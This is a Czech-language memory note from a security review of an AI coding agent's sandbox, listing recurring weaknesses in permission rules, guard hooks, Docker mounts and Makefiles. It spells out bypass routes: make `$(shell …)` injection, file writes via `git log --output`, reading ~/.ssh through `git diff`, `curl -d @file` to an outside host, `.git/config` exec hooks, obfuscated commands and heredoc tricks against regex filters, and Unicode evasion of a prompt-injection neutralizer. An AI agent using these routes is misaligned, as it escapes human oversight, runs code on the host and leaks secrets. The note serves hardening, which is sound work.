---
name: opakovane-chyby-tymu
description: Typy bezpečnostních chyb, které tým agentů t360 opakovaně dělá (agentní sandbox, Docker, hooky, Makefile) – kontrolovat jako první při každé revizi
metadata:
  type: project
---

Nalezeno při revizi M1 (plán 001, kola 1–3, 2026-10-03). Při další revizi hledat jako první:

1. **`Bash(make *)` v allow = spouštění na hostiteli.** Validace ARGS v receptu nestačí: make proměnné
   z příkazové řádky exportuje a přitom je EXPANDUJE → `ARGS='install $(shell cmd)'` spustí cmd dřív,
   než recept validuje. Dále `COMPOSE='cmd;'`, `SHELL=./x.sh`, `--eval='$(shell …)'`, `-f soubor.mk`.
   Ověřovat v kopii Makefile ve scratchpadu (COMPOSE nahradit echo), ne `make -n`.
2. **Ochrana "spustitelných" souborů jen jmenovitě** (chran-soubory.sh): chybí soubory, které nástroj
   načte NAMÍSTO/NAVÍC: `GNUmakefile`/`makefile` (přednost před Makefile), `compose.override.yml`,
   `docker-compose.override.yml` (auto-load bez -f), skripty spouštěné na hostiteli (`tests/Hooks/*.sh`
   přes make), `.claude/skills/*` (frontmatter `allowed-tools`, `hooks`). Cesta se nenormalizuje
   (`/./`, `//`, `..` projde). Hook kryje jen Edit/Write – zápis přes Bash/kontejner ne.
3. **Bind mount `.:/app` rw** → z kontejneru (povolený `exec -T app php -r`) jde přepsat compose.yaml,
   Makefile, docker/, .mcp.json, .env a vytvořit override soubory = cesta kontejner → hostitel (root přes
   docker socket). `.env` je v kontejneru čitelný i když `environment:` je zúžené.
4. **Regexy/substring filtry v bash-strazce.sh**: obchvaty zkratkami git voleb (`--no-veri`, `--amen`),
   první shoda ARGS v celém řetězci (druhý `make composer` v `&&` projde), `ARGS=-n\ require\ x`,
   composer přes `php /usr/local/bin/composer`, únik env přes `php -i`/`$_SERVER`, čtení .env přes
   povolené `jq`/`grep -r` (Read deny neplatí pro Bash). Falešné poplachy: heredoc commit zpráva
   s řádkem začínajícím `php`/`env`/`composer` → deny.
5. **Skill `allowed-tools` znovu rozšiřuje to, co settings zúžily** (commit: `Bash(docker compose *)`,
   `Bash(make *)`), skill je volatelný modelem.
6. **"Čtecí" příkazy v allow jsou zápisové/exfil primitivy** (kolo 3, přehlédnuto v kole 2!):
   `git log --format=…%n… --output=SOUBOR` zapíše libovolný obsah kamkoli (Makefile, compose.yaml,
   hook skripty → hook prázdný = fail-open, ~/.bashrc); `git diff --no-index /dev/null ~/.ssh/…` čte
   libovolný soubor; `curl -s http://localhost:8080/x -o Makefile` / `file:///…` / `-d @soubor https://cizí`;
   `jq -R . /cokoli` a `.e''nv`. Při každé revizi projít KAŽDOU položku allow: umí zapsat soubor,
   číst mimo repo, spustit kód přes config? Prefix pravidlo `Bash(x*)` povolí všechny volby.
7. **`.git/config` není chráněný pro Bash zápis** → `core.fsmonitor`/`core.pager`/`alias` = exec při
   povoleném `git status`. `git config` (ne --global) není gated. acceptEdits auto-schvaluje cp/mv/sed.
8. Hook bash-strazce: C0 bez normalizace (`\make`, `/usr/bin/make`, `ma''ke`), `MAKEFLAGS+=`,
   skrytí řádků falešným heredocem (`echo 'git commit <<X'`), `cat <<EOF | bash`. Zápis přes
   interpretery (python3 -c) hook nevidí – vývojář tak upravil i samotný hook.
9. Starší (kolo 1, opraveno): env_file pro všechny služby, root@'%', plochá síť MCP, `config -q && config`.
10. **Kolo 4 (2026-10-03) – přehlédnuto i po zúžení allow:** `Bash(git restore --staged *)` umí
    `--worktree`/`-W`/`--wor`/`--source=`/`-Ws` = zápis do pracovního stromu, tj. i do settings.json a hooků.
    Útok: návrat na slabší verzi z HEAD/historie (opravy kol bývají necommitnuté!). `git add/commit
    --pathspec-from-file=SOUBOR` (i zkratka `--pathspec-fr`) vypíše řádky libovolného souboru v chybové
    hlášce → obchází `Read(./.env)` deny i file_arg_gate. Kanál ven: povolené `mcp__context7` (vzdálené HTTP) / playwright.
11. Makefile obrana proměnných z CLI: `CLI_VARS :=` bez `override` jde přebít `CLI_VARS=` z příkazové řádky.
    `VAR!=cmd` a `VAR:=$(shell …)` na příkazové řádce se spustí DŘÍV, než make přečte Makefile → Makefile to
    nikdy neubrání, jen přesný allow (`Bash(make test)`) + hook.
12. check_target v hooku ignoruje cíle mimo projekt (`>> ~/.bashrc`), vstupní `<` soubor (jq) se nekontroluje.
    Při každé revizi ověřit, zda Claude Code sám validuje cíle přesměrování u prefix-allow pravidel.
13. Ověřeno, NEtestovat znovu: git 2.34 u log/diff/show nebere zkratky `--out=`/`--ext`/`--textc`
    (setup_revisions), u add/commit/restore (parse-options) zkratky bere. `docker compose` v2.40 odmítá
    `-f/--file/--env-file` za podpříkazem. `jq import` nečte absolutní cesty ani `../`. Mount app je `.:/app:ro`.

14. **AI funkce (revize plánu 010 / příklad 09, 2026-10-09)** – LLM06/CSRF/XSS/mass assignment tým dělá dobře
    (pole čtená výčtem, stav vynucený v use-case, vše přes e()). Opakovaně slabé: (a) **žádný rate limit AI tras**
    (jen globální denní limit tokenů → jeden admin vyčerpá AI všem), (b) **dlouhé synchronní workflow** –
    časový rozpočet se kontroluje jen mezi některými kroky, curl timeout 90 s × až 8 volání ≫ nginx 120 s,
    session zamčená celou dobu (release() jen v 06), (c) `PromptData::neutralize` jde obejít `<`+U+200B
    (\p{Cf}), plnošířkovým `＜` U+FF1C a `&lt;` – ověřeno v kontejneru. Kontrolovat u každého nového příkladu.

**Why:** tým navrhuje pojistky jako prefix/regex filtry a výčty jmen souborů a přehlíží nepřímé cesty
(expanze v make, alternativní názvy souborů, zápis z kontejneru, skill oprávnění).
**How to apply:** u každé změny settings/hooků/Makefile/compose projít cesty „agent → host“
a „kontejner → host“; hooky testovat sadou obchvatů (spuštěním hooku s JSON vstupem) i falešných poplachů.
